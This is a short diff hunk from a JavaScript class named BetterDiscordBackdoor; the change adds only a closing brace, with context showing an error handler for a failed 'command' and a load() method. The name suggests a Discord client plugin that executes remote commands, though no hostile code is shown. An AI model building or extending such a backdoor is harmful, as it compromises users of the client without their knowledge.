@@ -41,6 +41,7 @@ class BetterDiscordBackdoor {
         } catch(e) {
           console.log("An error occurred while executing the command!", e);
         }
+      }
     }
     
     load() {
